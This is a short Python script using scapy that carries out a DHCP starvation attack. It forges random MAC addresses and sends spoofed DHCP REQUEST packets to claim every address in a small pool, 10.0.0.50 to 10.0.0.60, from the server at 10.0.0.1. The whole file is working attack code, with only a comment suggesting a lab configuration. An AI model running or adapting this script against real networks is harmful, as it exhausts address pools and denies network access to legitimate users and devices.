#!/usr/bin/env python3

# dhcp_starve.py: DHCP Starvation Attack (One-Shot Request Injection)

import time
import random
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC
import sys

IFACE = "eth0"
SERVER_IP = "10.0.0.1"

# Pool range defined in dhcpd.conf (50 to 60, inclusive)
IP_POOL_START = 50
IP_POOL_END = 60

def forge_and_request(target_ip):
    """Sends a forged DHCP Request to reserve a specific IP address."""
    
    # 1. Generate a forged identity
    forged_mac_str = str(RandMAC())
    raw_mac_bytes = bytes.fromhex(forged_mac_str.replace(':', ''))
    
    # Generate a unique Transaction ID
    xid = random.randint(1, 0xFFFFFFFF)
    
    # --- Step: DHCP REQUEST ---
    
    # L2/L3/L4 Base
    # Source is forged MAC, Destination is Broadcast
    ether_request = Ether(src=forged_mac_str, dst="ff:ff:ff:ff:ff:ff")
    ip_request = IP(src="0.0.0.0", dst="255.255.255.255")
    udp_request = UDP(sport=68, dport=67)
    
    # BOOTP: Client Hardware Address (chaddr) is the forged MAC
    bootp_request = BOOTP(chaddr=forged_mac_str, xid=xid)
    
    # DHCP Options: Type REQUEST (Option 3)
    # This acts as a 'claim' on the target_ip
    dhcp_request = DHCP(options=[
        ("message-type", "request"), 
        ("client_id", b'\x01' + raw_mac_bytes),
        ("requested_addr", target_ip),
        ("server_id", SERVER_IP),
        ("end")
    ])
    
    request_packet = ether_request / ip_request / udp_request / bootp_request / dhcp_request
    
    # Send REQUEST packet
    sendp(request_packet, iface=IFACE, verbose=False)
    
    sys.stdout.write(f"  [>>] REQUEST SENT: {target_ip} (MAC: {forged_mac_str})\r")
    sys.stdout.flush()

def dhcp_starvation_attack():
    """Runs the attack by iterating through the entire IP pool."""
    
    sys.stdout.write("[*] Beginning DHCP Starvation Attack (One-Shot Request Injection)...\n")
    sys.stdout.flush()

    leases_consumed = 0
    
    # Iterate through all 11 IPs in the pool (10.0.0.50 through 10.0.0.60)
    for i in range(IP_POOL_START, IP_POOL_END + 1):
        target_ip = f"10.0.0.{i}"
        
        # Send the forged request and wait briefly for the server to process the lease
        forge_and_request(target_ip)
        time.sleep(0.05) # Small delay to allow the server to commit the lease
        
        leases_consumed += 1
            
    sys.stdout.write(f"\n[SUCCESS] Attack finished. Total REQUESTS Sent: {leases_consumed}.\n")
    sys.stdout.write(f"[INFO] Verify leases file: /var/lib/dhcp/dhcpd.leases\n")
    sys.stdout.flush()


dhcp_starvation_attack()
